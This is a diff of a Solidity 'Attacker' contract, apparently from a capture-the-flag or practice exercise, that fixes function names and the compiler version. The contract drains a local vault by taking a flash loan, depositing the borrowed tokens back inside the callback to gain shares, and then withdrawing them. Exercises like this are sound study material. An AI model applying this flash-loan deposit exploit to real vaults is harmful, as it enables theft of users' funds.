@@ -1,14 +1,11 @@
 // SPDX-License-Identifier:  None
-pragma solidity ^0.8.0;
+pragma solidity 0.8.20;
 
 import "./vault.sol";
 
 import "./token.sol";
 
 contract Attacker {
-
-    // Attacker2 attacker2;
-
     Vault vault;
     Token token;
 
@@ -21,13 +18,13 @@ contract Attacker {
 
         uint256 value = token.balanceOf(address(vault));
         
-        vault.flushLoan(value);
+        vault.flashLoan(value);
     
         vault.withdraw(vault.balanceOf(address(this)));
     }
 
 
-    function onFlushLoan (address caller, uint256 amount) external  {
+    function onFlashLoan (address caller, uint256 amount) external  {
         require(caller == address(vault));
         token.approve(address(vault), amount);
         vault.deposit(amount);
